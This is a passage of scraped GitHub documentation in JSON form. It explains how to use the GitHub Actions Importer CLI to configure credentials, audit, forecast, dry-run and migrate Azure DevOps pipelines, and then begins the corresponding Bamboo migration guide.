          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectAzure DevOps, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Personal access token for Azure DevOps\", enter the value for the Azure DevOps personal access token that you created earlier, and pressEnter.For \"Base url of the Azure DevOps instance\", pressEnterto accept the default value (https://dev.azure.com).For \"Azure DevOps organization name\", enter the name for your Azure DevOps organization, and pressEnter.For \"Azure DevOps project name\", enter the name for your Azure DevOps project, and pressEnter.An example of theconfigurecommand is shown below:$gh actions-importer configure✔ Which CI providers are you configuring?: Azure DevOps\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Personal access token for Azure DevOps: ***************\n✔ Base url of the Azure DevOps instance: https://dev.azure.com\n✔ Azure DevOps organization name: :organization\n✔ Azure DevOps project name: :project\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectAzure DevOps, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Personal access token for Azure DevOps\", enter the value for the Azure DevOps personal access token that you created earlier, and pressEnter.",
          "For \"Base url of the Azure DevOps instance\", pressEnterto accept the default value (https://dev.azure.com).",
          "For \"Azure DevOps organization name\", enter the name for your Azure DevOps organization, and pressEnter.",
          "For \"Azure DevOps project name\", enter the name for your Azure DevOps project, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to the GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of Azure DevOps"
      },
      {
        "type": "paragraph",
        "text": "You can use theauditcommand to get a high-level view of all projects in an Azure DevOps organization."
      },
      {
        "type": "paragraph",
        "text": "Theauditcommand performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the projects defined in an Azure DevOps organization.",
          "Converts each pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit of an Azure DevOps organization, run the following command in your terminal:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit azure-devops --output-dir tmp/audit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecast potential GitHub Actions usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in Azure DevOps."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions usage, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast azure-devops --output-dir tmp/forecast_reports"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Queue timemetrics describe the amount of time a job spent waiting for a runner to be available to execute it.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, these metrics are defined for each queue of runners in Azure DevOps. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a dry-run migration"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert an Azure DevOps pipeline to an equivalent GitHub Actions workflow. A dry run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the dry-run command for a build pipeline"
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your Azure DevOps build pipeline to GitHub Actions, run the following command in your terminal, replacingpipeline_idwith the ID of the pipeline you are converting."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run azure-devops pipeline --pipeline-id :pipeline_id --output-dir tmp/dry-run"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the dry-run command for a release pipeline"
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your Azure DevOps release pipeline to GitHub Actions, run the following command in your terminal, replacingpipeline_idwith the ID of the pipeline you are converting."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run azure-devops release --pipeline-id :pipeline_id --output-dir tmp/dry-run"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a production migration"
      },
      {
        "type": "paragraph",
        "text": "You can use themigratecommand to convert an Azure DevOps pipeline and open a pull request with the equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command for a build pipeline"
      },
      {
        "type": "paragraph",
        "text": "To migrate an Azure DevOps build pipeline to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, andpipeline_idwith the ID of the pipeline you are converting."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate azure-devops pipeline --pipeline-id :pipeline_id --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate azure-devops pipeline --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --azure-devops-project my-azure-devops-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command for a release pipeline"
      },
      {
        "type": "paragraph",
        "text": "To migrate an Azure DevOps release pipeline to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, andpipeline_idwith the ID of the pipeline you are converting."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate azure-devops release --pipeline-id :pipeline_id --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate azure-devops release --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --azure-devops-project my-azure-devops-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Azure DevOps."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuration environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your Azure DevOps instance:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requires theworkflowscope).",
          "GITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example,https://github.com).",
          "AZURE_DEVOPS_ACCESS_TOKEN: The personal access token used to authenticate with your Azure DevOps instance. This token requires the following scopes:Build:ReadAgent Pools:ReadCode:ReadRelease:ReadService Connections:ReadTask Groups:ReadVariable Groups:Read",
          "Build:Read",
          "Agent Pools:Read",
          "Code:Read",
          "Release:Read",
          "Service Connections:Read",
          "Task Groups:Read",
          "Variable Groups:Read",
          "AZURE_DEVOPS_PROJECT: The project name or GUID to use when migrating a pipeline. If you'd like to perform an audit on all projects, this is optional.",
          "AZURE_DEVOPS_ORGANIZATION: The organization name of your Azure DevOps instance.",
          "AZURE_DEVOPS_INSTANCE_URL: The URL to the Azure DevOps instance, such ashttps://dev.azure.com."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that is loaded by GitHub Actions Importer when it is run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with theforecast,dry-run, ormigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run azure-devops pipeline --output-dir ./output/ --source-file-path ./path/to/azure_devops/pipeline.yml"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "paragraph",
        "text": "The--config-file-pathargument can also be used to specify which repository a converted reusable workflow or composite action should be migrated to."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit azure-devops pipeline --output-dir ./output/ --config-file-path ./path/to/azure_devops/config.yml"
      },
      {
        "type": "paragraph",
        "text": "To audit an Azure DevOps instance using a configuration file, the configuration file must be in the following format and eachrepository_slugmust be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: azdo-project/1\n    path: file.yml\n  - repository_slug: azdo-project/2\n    paths: path.yml"
      },
      {
        "type": "paragraph",
        "text": "You can generate therepository_slugfor a pipeline by combining the Azure DevOps organization name, project name, and the pipeline ID. For example,my-organization-name/my-project-name/42."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Dry run example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run."
      },
      {
        "type": "paragraph",
        "text": "The pipeline is selected by matching therepository_slugin the configuration file to the value of the--azure-devops-organizationand--azure-devops-projectoption. Thepathis then used to pull the specified source file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run azure-devops pipeline --output-dir ./output/ --config-file-path ./path/to/azure_devops/config.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Specify the repository of converted reusable workflows and composite actions"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the YAML file provided to the--config-file-pathargument to determine the repository that converted reusable workflows and composite actions are migrated to."
      },
      {
        "type": "paragraph",
        "text": "To begin, you should run an audit without the--config-file-pathargument:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit azure-devops --output-dir ./output/"
      },
      {
        "type": "paragraph",
        "text": "The output of this command will contain a file namedconfig.ymlthat contains a list of all the reusable workflows and composite actions that were converted by GitHub Actions Importer. For example, theconfig.ymlfile may have the following contents:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "reusable_workflows:\n  - name: my-reusable-workflow.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n\ncomposite_actions:\n  - name: my-composite-action.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main"
      },
      {
        "type": "paragraph",
        "text": "You can use this file to specify which repository and ref a reusable workflow or composite action should be added to. You can then use the--config-file-pathargument to provide theconfig.ymlfile to GitHub Actions Importer. For example, you can use this file when running amigratecommand to open a pull request for each unique repository defined in the config file:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate azure-devops pipeline --config-file-path config.yml --target-url https://github.com/my-org/my-repo"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported syntax for Azure DevOps pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the type of properties that GitHub Actions Importer is currently able to convert."
      },
      {
        "type": "paragraph",
        "text": "For more information about supported Azure DevOps tasks, see thegithub/gh-actions-importerrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variable mapping"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default Azure DevOps environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Templates"
      },
      {
        "type": "paragraph",
        "text": "You can transform Azure DevOps templates with GitHub Actions Importer."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer is able to transform Azure DevOps templates with some limitations."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Azure DevOps templates used under thestages,deployments, andjobskeys are converted into reusable workflows in GitHub Actions. For more information, seeReusing workflows.",
          "Azure DevOps templates used under thestepskey are converted into composite actions. For more information, seeCreating a composite action.",
          "If you currently have job templates that reference other job templates, GitHub Actions Importer converts the templates into reusable workflows. Because reusable workflows cannot reference other reusable workflows, this is invalid syntax in GitHub Actions. You must manually correct nested reusable workflows.",
          "If a template references an external Azure DevOps organization or GitHub repository, you must use the--credentials-fileoption to provide credentials to access this template. For more information, seeSupplemental arguments and settings.",
          "You can dynamically generate YAML usingeachexpressions with the following caveats:Nestedeachblocks are not supported and cause the parenteachblock to be unsupported.eachand containedifconditions are evaluated at transformation time, because GitHub Actions does not support this style of insertion.elseifblocks are unsupported. If this functionality is required, you must manually correct them.Nestedifblocks are supported, butif/elseif/elseblocks nested under anifcondition are not.ifblocks that use predefined Azure DevOps variables are not supported.",
          "Nestedeachblocks are not supported and cause the parenteachblock to be unsupported.",
          "eachand containedifconditions are evaluated at transformation time, because GitHub Actions does not support this style of insertion.",
          "elseifblocks are unsupported. If this functionality is required, you must manually correct them.",
          "Nestedifblocks are supported, butif/elseif/elseblocks nested under anifcondition are not.",
          "ifblocks that use predefined Azure DevOps variables are not supported."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Supported templates"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer supports the templates listed in the table below."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Template file path names"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer can extract templates with relative or dynamic file paths with variable, parameter, and iterative expressions in the file name. However, there must be a default value set."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Variable file path name example"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# File: azure-pipelines.yml\nvariables:\n- template: 'templates/vars.yml'\n\nsteps:\n- template: \"./templates/$\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# File: templates/vars.yml\nvariables:\n  one: 'simple_step.yml'"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Parameter file path name example"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "parameters:\n- name: template\n  type: string\n  default: simple_step.yml\n\nsteps:\n- template: \"./templates/${{ parameters.template }}\""
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Iterative file path name example"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "parameters:\n- name: steps\n  type: object\n  default:\n  - build_step\n  - release_step\nsteps:\n- ${{ each step in parameters.steps }}:\n    - template: \"$-variables.yml\""
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Template parameters"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer supports the parameters listed in the table below."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "A template used under thestepkey with this parameter type is only serialized as a composite action if the steps are used at the beginning or end of the template steps. A template used under thestage,deployment, andjobkeys with this parameter type are not transformed into a reusable workflow, and instead are serialized as a standalone workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from Bamboo with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Bamboo pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A Bamboo account or organization with projects and pipelines that you want to convert to GitHub Actions workflows.",
          "Bamboo version of 7.1.1 or greater.",
          "Access to create a Bamboo personal access token for your account or organization.",
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations when migrating from Bamboo to GitHub Actions with GitHub Actions Importer:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GitHub Actions Importer relies on the YAML specification generated by the Bamboo Server to perform migrations. When Bamboo does not support exporting something to YAML, the missing information is not migrated.",
          "Trigger conditions are unsupported. When GitHub Actions Importer encounters a trigger with a condition, the condition is surfaced as a comment and the trigger is transformed without it.",
          "Bamboo Plans with customized settings for storing artifacts are not transformed. Instead, artifacts are stored and retrieved using theupload-artifactanddownload-artifactactions.",
          "Disabled plans must be disabled manually in the GitHub UI. For more information, seeDisabling and enabling a workflow.",
          "Disabled jobs are transformed with aif: falsecondition which prevents it from running. You must remove this to re-enable the job.",
          "Disabled tasks are not transformed because they are not included in the exported plan when using the Bamboo API.",
          "Bamboo provides options to clean up build workspaces after a build is complete. These are not transformed because it is assumed GitHub-hosted runners or ephemeral self-hosted runners will automatically handle this.",
          "The hanging build detection options are not transformed because there is no equivalent in GitHub Actions. The closest option istimeout-minuteson a job, which can be used to set the maximum number of minutes to let a job run. For more information, seeWorkflow syntax for GitHub Actions.",
          "Pattern match labeling is not transformed because there is no equivalent in GitHub Actions.",
          "All artifacts are transformed into anactions/upload-artifact, regardless of whether they aresharedor not, so they can be downloaded from any job in the workflow.",
          "Permissions are not transformed because there is no suitable equivalent in GitHub Actions.",
          "If the Bamboo version is between 7.1.1 and 8.1.1, project and plan variables will not be migrated."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "Certain Bamboo constructs must be migrated manually. These include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Masked variables",
          "Artifact expiry settings"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with Bamboo and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create a Bamboo personal access token. For more information, seePersonal Access Tokensin the Bamboo documentation.Your token must have the following permissions, depending on which resources will be transformed.Resource TypeViewView ConfigurationEditBuild PlanDeployment ProjectDeployment EnvironmentAfter creating the token, copy it and save it in a safe location for later use.",
          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectBamboo, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Personal access token for Bamboo\", enter the value for the Bamboo personal access token that you created earlier, and pressEnter.For \"Base url of the Bamboo instance\", enter the URL for your Bamboo Server or Bamboo Data Center instance, and pressEnter.An example of theconfigurecommand is shown below:$gh actions-importer configure✔ Which CI providers are you configuring?: Bamboo\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Personal access token for Bamboo: ********************\n✔ Base url of the Bamboo instance: https://bamboo.example.com\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectBamboo, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Personal access token for Bamboo\", enter the value for the Bamboo personal access token that you created earlier, and pressEnter.",
          "For \"Base url of the Bamboo instance\", enter the URL for your Bamboo Server or Bamboo Data Center instance, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of Bamboo"
      },
      {
        "type": "paragraph",
        "text": "You can use theauditcommand to get a high-level view of all projects in a Bamboo organization."
      },
      {
        "type": "paragraph",
